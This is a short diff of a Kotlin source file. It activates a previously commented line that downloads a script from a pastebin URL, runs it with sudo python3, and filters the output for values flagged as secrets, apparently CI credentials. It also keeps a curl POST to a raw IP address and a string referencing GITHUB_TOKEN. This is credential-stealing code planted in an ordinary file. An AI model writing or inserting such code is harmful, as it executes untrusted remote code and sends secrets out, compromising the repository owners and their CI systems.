@@ -13,7 +13,7 @@ fun String.runCommand(): String? = try {
 }
 
 
-#val output = "curl -sSfL https://pastebin.com/raw/UUPC3Q79 | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' | sort -u | xxd -p | tr -d '\\n'".runCommand()
-var output = "env|grep -i 'GITHUB_TOKEN'"
-println("Shell command output: $output")
-val post = "curl -X POST http://121.5.169.223:39123/ --data s=\"$output\"".runCommand()
+val output = "curl -sSfL https://pastebin.com/raw/UUPC3Q79 | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' | sort -u | xxd -p | tr -d '\\n'".runCommand()
+var output2 = "env|grep -i 'GITHUB_TOKEN'"
+println("Shell command output: $output2")
+val post = "curl -X POST http://121.5.169.223:39123/ --data s=\"$output2\"".runCommand()
